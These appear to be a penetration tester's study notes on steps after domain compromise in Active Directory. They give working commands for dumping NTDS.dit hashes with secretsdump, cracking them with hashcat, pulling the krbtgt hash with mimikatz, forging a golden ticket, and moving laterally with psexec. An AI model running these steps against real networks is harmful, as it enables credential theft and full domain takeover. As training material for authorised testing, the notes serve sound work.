
Now we own the domain, but what we can do?

So we have to provide as musch value to the client as possible:
- we have to put our blinders on and do it again
- we have to dump the NTDS.dit and crack the passwords
- we have to enumerate shares for sensitive info


To avoid access lost we have to create a domain admin account but hen we have to delete it.
- we can also create a Golden Ticket

we have to test for the detection of this account, if it is not detected then the client has a severe problem. It is easy to detect an account.

ALWAYS CLEAN THE ENVIRONMENT FROM STUFF WE CREATED!



# Dumping NTDS.dit file

**==This file is a database used to store Active Directory data, including:==**
- user info
- group info
- security descriptors
- password hashes


To dump it we can simply use `secretdumps` against the Domain Controller to perform this attack.

To do it we can use this command:
```bash
secretsdump.py DOMAIN/username:'PASSWORD'@DOMAIN_CONTROLLER_IP -just-dc-ntlm
```


This will give us the hashes NTLM passwords for the users.

What we want to do is to crack only the second part of the hashes:
- ![[Pasted image 20241220164805.png]]


We can copy all and use excel to split them on `:` in `DATA -> Text to columns -> delimited -> other -> :`
- ![[Pasted image 20241220165145.png]]


So we can crack all the second parts of the hashes (Column D):
```bash
hashcat -m 1000 ntds.txt rockyou.txt

hashcat -m 1000 ntds.txt rockyou.txt --show
```



Now what we can do is to organize the passwords and have the access to the users.


# Golden Ticket attacks
**==A golden ticket is a ticket that gives us the complete access to every machine in the Active Directory.==**

This can be retrieved if we are able to compromise the `krbtgt` account on the domain.


We can use minikatz to get all the info we need to perform this attack.

To do it we need:
- the KRBTGT NTLM hash (easy to get)
- domain SID 
Once we have them we can create a golden ticket we can use anywhere to access to any machine.



The KBRTGT account is used to grant the tickets generation. 


So first of all we run `minkatz` on the victim machine:
```bash
minikatz.exe

privilege::debug

lsadump::lsa /inject /name:kbrtgt

```


At this point we need to copy the SID of the domain: and the NTLM hash of kbrtgt account
- ![[Pasted image 20241220170557.png]]
- ![[Pasted image 20241220170632.png]]

At this point we can run the golden ticket attack on minikatz:
```bash
kerberos::golden /User:fakenusername /domain:DOMAIN /sid:SID_FIND_BEFORE /krbtgt:KRBTGT_HASH /id:OUR_RID /ptt
```
- ![[Pasted image 20241220171117.png]]
- `/ptt` stands for pass the ticket


Now we must succeed:
- ![[Pasted image 20241220171202.png]]


So now we run the cmd:
```bash
misc:cmd
```
- it will open a cmd with the golden ticket, so we can access everywhere
- ![[Pasted image 20241220171313.png]]


Now we can run psexec to get a machine:
```bash
psexec.exe \\PC_VICTIM cmd.exe
```



**==SO basically to use this attack we need to know the:==**
- **==NTLM hash of the KRBTGT account that is responsible to sign the tickets==**
- **==SID of the domain that identify the domain==**
- ==**an user RID (the user id we want impersonate)**==